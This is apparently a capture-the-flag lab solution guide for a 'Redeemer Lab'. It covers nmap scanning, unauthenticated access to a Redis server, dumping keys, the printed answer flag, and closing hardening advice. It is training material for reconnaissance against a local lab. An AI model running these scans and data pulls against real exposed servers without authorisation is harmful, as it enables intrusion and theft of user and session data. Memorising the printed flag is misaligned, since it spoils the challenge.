# Redeemer Lab - Command Guide & Solution

## 🎯 Objective

Find and extract the flag from a misconfigured Redis database service using network enumeration and service interaction techniques.

**Flag Format**: `LUH{...}`

---

## 📋 Prerequisites

Before starting, ensure:
1. Lab is running: `docker-compose ps` (all services should be "Up")
2. You have access to the OS instance at `http://localhost:6080`
3. Terminal is open in the OS instance

---

## 🚀 Solution Commands

### Step 1: Understand Your Environment

#### Check Your Network Configuration
```bash
# View your IP address and network interfaces
ip addr show
```

**Expected Output**:
```
...
inet 172.20.0.3/16 brd 172.20.255.255 scope global eth0
...
```

#### Check Your Routing Table
```bash
# View network routes
ip route
```

**Expected Output**:
```
172.20.0.0/16 dev eth0 proto kernel scope link src 172.20.0.3
```

**Key Takeaway**: You're on network `172.20.0.0/16` with IP `172.20.0.3`

---

### Step 2: Network Discovery

#### Quick Host Discovery (Recommended)
```bash
# Scan the local subnet for active hosts
nmap -sn 172.20.0.0/24
```

**Expected Output**:
```
Starting Nmap 7.x
Nmap scan report for 172.20.0.2
Host is up (0.00010s latency).
Nmap scan report for 172.20.0.3
Host is up (0.0000s latency).
Nmap done: 256 IP addresses (2 hosts up)
```

**Identified Targets**:
- `172.20.0.2` - Target Redis server
- `172.20.0.3` - Your attacker machine

#### Alternative: Full Network Scan
```bash
# Scan entire Docker network (slower)
nmap -sn 172.20.0.0/16
```

---

### Step 3: Port Scanning

#### Quick Default Port Scan
```bash
# Scan top 1000 ports on target
nmap 172.20.0.2
```

**Expected Output**:
```
PORT     STATE SERVICE
6379/tcp open  redis
```

#### Comprehensive Port Scan
```bash
# Scan all 65535 ports (takes longer)
nmap -p- 172.20.0.2
```

#### Fast Service Detection
```bash
# Identify service version on specific port
nmap -p 6379 -sV 172.20.0.2
```

**Expected Output**:
```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.2.6
```

#### Detailed Enumeration with Scripts
```bash
# Use NSE scripts for detailed info
nmap -p 6379 -sC -sV 172.20.0.2
```

**Key Finding**: Redis service running on port 6379 (default)

---

### Step 4: Test Connectivity

#### Simple TCP Connection Test
```bash
# Test if port is reachable
nc -zv 172.20.0.2 6379
```

**Expected Output**:
```
Connection to 172.20.0.2 6379 port [tcp/*] succeeded!
```

#### Alternative: Telnet Test
```bash
# Interactive connection test
telnet 172.20.0.2 6379
```

**Expected**: Connection established, press `Ctrl+]` then type `quit` to exit

---

### Step 5: Connect to Redis

#### Connect Using redis-cli
```bash
# Connect to Redis server
redis-cli -h 172.20.0.2
```

**Expected Prompt**:
```
172.20.0.2:6379>
```

✅ **Success**: You're now connected to Redis!

---

### Step 6: Test Authentication

#### Send PING Command
```bash
# Test if authentication is required
172.20.0.2:6379> PING
```

**Expected Response**: `PONG`

**Key Finding**: No authentication required! This is a **critical vulnerability**.

---

### Step 7: Information Gathering

#### Get Server Information
```bash
172.20.0.2:6379> INFO
```

**Sample Output**:
```
# Server
redis_version:6.2.6
redis_mode:standalone
os:Linux 5.x
tcp_port:6379
...

# Replication
role:master
connected_slaves:0

# Keyspace
db0:keys=25,expires=0
```

**Key Observations**:
- Redis version: 6.2.6
- Running in standalone mode
- Database 0 has 25 keys
- No password configured

#### Get Server Configuration
```bash
172.20.0.2:6379> CONFIG GET *
```

**Important Findings**:
```
"requirepass"     ""              # No password!
"protected-mode"  "no"            # Security feature disabled
"bind"           "0.0.0.0"        # Listening on all interfaces
```

**Security Issues Identified**:
- ❌ No authentication
- ❌ Protected mode disabled
- ❌ Exposed to network

---

### Step 8: Enumerate Database

#### List All Keys
```bash
172.20.0.2:6379> KEYS *
```

**Expected Output** (example):
```
1) "flag"
2) "fake_flag_1"
3) "fake_flag_2"
4) "user:1001"
5) "session:abc123"
6) "config:app"
7) "cache:home"
... (more keys)
```

**Key Observation**: Multiple keys present, including "flag" and fake flags

#### Count Total Keys
```bash
172.20.0.2:6379> DBSIZE
```

**Expected Output**: `(integer) 25`

---

### Step 9: Examine Interesting Keys

#### Check Key Types
```bash
172.20.0.2:6379> TYPE flag
```

**Expected Output**: `string`

#### Get Flag Value
```bash
172.20.0.2:6379> GET flag
```

**Expected Output**: 🎉 `LUH{R3d1s_3num3r4t10n_m4st3r_2026}`

✅ **FLAG CAPTURED!**

#### Verify Decoy Flags (Optional)
```bash
172.20.0.2:6379> GET fake_flag_1
172.20.0.2:6379> GET fake_flag_2
172.20.0.2:6379> GET fake_flag_3
```

**These will return**: Fake flag values (not the real flag)

---

### Step 10: Explore Additional Data (Optional)

#### Examine User Data
```bash
172.20.0.2:6379> GET user:1001
172.20.0.2:6379> GET user:1002
```

#### Check Session Tokens
```bash
172.20.0.2:6379> GET session:abc123
```

#### View Configuration
```bash
172.20.0.2:6379> GET config:app
```

#### List All String Keys Pattern
```bash
172.20.0.2:6379> KEYS user:*
172.20.0.2:6379> KEYS session:*
172.20.0.2:6379> KEYS config:*
```

---

### Step 11: Document Findings

#### Exit Redis
```bash
172.20.0.2:6379> EXIT
```

or press `Ctrl+C`

---

## 📝 Complete Solution (Copy-Paste Script)

Here's a complete script you can run step-by-step:

```bash
#!/bin/bash

echo "=== Step 1: Network Discovery ==="
nmap -sn 172.20.0.0/24

echo -e "\n=== Step 2: Port Scanning ==="
nmap -p 6379 -sV 172.20.0.2

echo -e "\n=== Step 3: Connectivity Test ==="
nc -zv 172.20.0.2 6379

echo -e "\n=== Step 4: Redis Enumeration ==="
echo "Now connecting to Redis..."
echo "Run these commands in redis-cli:"
echo "  PING"
echo "  INFO"
echo "  CONFIG GET requirepass"
echo "  KEYS *"
echo "  GET flag"

redis-cli -h 172.20.0.2
```

---

## 🎯 Quick Command Reference

### Essential Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `ip addr show` | View network config | Shows your IP address |
| `nmap -sn <network>` | Host discovery | `nmap -sn 172.20.0.0/24` |
| `nmap -p <port> -sV <ip>` | Service detection | `nmap -p 6379 -sV 172.20.0.2` |
| `nc -zv <ip> <port>` | Connection test | `nc -zv 172.20.0.2 6379` |
| `redis-cli -h <ip>` | Connect to Redis | `redis-cli -h 172.20.0.2` |

### Redis Commands

| Command | Purpose | Example Output |
|---------|---------|----------------|
| `PING` | Test connection | `PONG` |
| `INFO` | Server information | Detailed server stats |
| `CONFIG GET *` | View configuration | All config parameters |
| `KEYS *` | List all keys | Array of key names |
| `DBSIZE` | Count keys | `(integer) 25` |
| `TYPE <key>` | Get key type | `string`, `list`, `hash`, etc. |
| `GET <key>` | Retrieve value | Key's value |
| `EXIT` | Disconnect | Closes connection |

---

## 🔍 Troubleshooting

### Issue: Cannot connect to Redis

**Problem**: `redis-cli -h 172.20.0.2` doesn't connect

**Solutions**:
```bash
# Check if Redis container is running
docker-compose ps

# Verify network connectivity
ping 172.20.0.2

# Check if port is open
nmap -p 6379 172.20.0.2

# View Redis logs
docker-compose logs redis
```

### Issue: Wrong IP address

**Problem**: Target IP is not 172.20.0.2

**Solution**:
```bash
# Discover the correct IP
nmap -sn 172.20.0.0/24

# Identify which host has port 6379 open
nmap -p 6379 172.20.0.0/24 --open
```

### Issue: Connection refused

**Problem**: `Connection refused` error

**Solutions**:
```bash
# Restart the lab
docker-compose restart

# Check if services are healthy
docker-compose ps

# Rebuild if necessary
docker-compose down
docker-compose up -d
```

### Issue: redis-cli command not found

**Problem**: `bash: redis-cli: command not found`

**Solutions**:
```bash
# Install redis-tools (already included in lab)
sudo apt-get update
sudo apt-get install redis-tools

# Or use alternative connection method
telnet 172.20.0.2 6379
```

---

## 💡 Key Learning Points

### What You Discovered

1. **Network Reconnaissance**
   - How to identify active hosts on a network
   - How to scan for open ports
   - How to detect service versions

2. **Service Enumeration**
   - Redis runs on default port 6379
   - Version detection reveals potential vulnerabilities
   - Service fingerprinting aids in attack planning

3. **Authentication Bypass**
   - No password required (`requirepass ""`)
   - Protected mode disabled
   - Direct access to all data

4. **Data Exfiltration**
   - Enumerate all keys with `KEYS *`
   - Extract data with `GET` command
   - Identify valuable information among decoys

### Security Vulnerabilities Found

| Vulnerability | Severity | Impact |
|---------------|----------|--------|
| No Authentication | **Critical** | Anyone can access data |
| Network Exposure | **High** | Accessible from any network location |
| Protected Mode Off | **High** | No security warnings or restrictions |
| Default Port | **Medium** | Easy to find and identify |
| Dangerous Commands | **Medium** | Can modify or delete data |

---

## 🎓 Next Steps

### Improve Your Skills

1. **Try Different Scanning Techniques**:
   ```bash
   # Stealth SYN scan
   sudo nmap -sS 172.20.0.2
   
   # UDP scan (slower)
   sudo nmap -sU 172.20.0.2
   
   # Aggressive scan with OS detection
   sudo nmap -A 172.20.0.2
   ```

2. **Explore Redis Commands**:
   ```bash
   # View specific info sections
   INFO server
   INFO replication
   INFO keyspace
   
   # Get specific config values
   CONFIG GET maxmemory
   CONFIG GET save
   
   # Monitor live commands (Ctrl+C to stop)
   MONITOR
   ```

3. **Practice Data Analysis**:
   ```bash
   # Pattern matching
   KEYS user:*
   KEYS session:*
   
   # Scan keys (safer for large databases)
   SCAN 0 MATCH user:* COUNT 10
   
   # Check key TTL
   TTL session:abc123
   ```

---

## 🛡️ How to Secure Redis (Prevention)

### Recommended Security Controls

1. **Enable Authentication**:
   ```conf
   requirepass YourStrongPasswordHere
   ```

2. **Bind to Localhost Only**:
   ```conf
   bind 127.0.0.1
   ```

3. **Enable Protected Mode**:
   ```conf
   protected-mode yes
   ```

4. **Disable Dangerous Commands**:
   ```conf
   rename-command FLUSHDB ""
   rename-command FLUSHALL ""
   rename-command CONFIG ""
   ```

5. **Use Firewall Rules**:
   ```bash
   # Only allow specific IPs
   iptables -A INPUT -p tcp -s 192.168.1.10 --dport 6379 -j ACCEPT
   iptables -A INPUT -p tcp --dport 6379 -j DROP
   ```

---

## ✅ Completion Checklist

- [ ] Successfully discovered target host (172.20.0.2)
- [ ] Identified Redis service on port 6379
- [ ] Connected to Redis without authentication
- [ ] Retrieved server information with `INFO`
- [ ] Reviewed configuration with `CONFIG GET *`
- [ ] Listed all keys with `KEYS *`
- [ ] Extracted the flag: `LUH{R3d1s_3num3r4t10n_m4st3r_2026}`
- [ ] Explored additional data (users, sessions, config)
- [ ] Documented security vulnerabilities found
- [ ] Understood how to properly secure Redis

---

## 🎉 Congratulations!

You've successfully completed the Redeemer Lab! You've learned:
- Network reconnaissance fundamentals
- Service enumeration techniques
- Redis interaction and querying
- Data extraction from NoSQL databases
- Security misconfiguration identification

**Remember**: Always use these skills ethically and only on systems you're authorized to test!

---

## 📚 Additional Resources

### Learn More About Redis Security
- [Redis Security Best Practices](https://redis.io/topics/security)
- [Redis Command Reference](https://redis.io/commands)
- [HackTricks - Redis Pentesting](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

### Continue Your Learning
- Try intermediate Redis challenges
- Explore authenticated Redis exploitation
- Learn about Redis replication attacks
- Study Redis module backdoors

### Practice More
- HackTheBox: Similar challenges
- TryHackMe: Network enumeration rooms
- VulnHub: Database security VMs
- PentesterLab: Redis exercises

---

**Happy Hacking! 🚀**
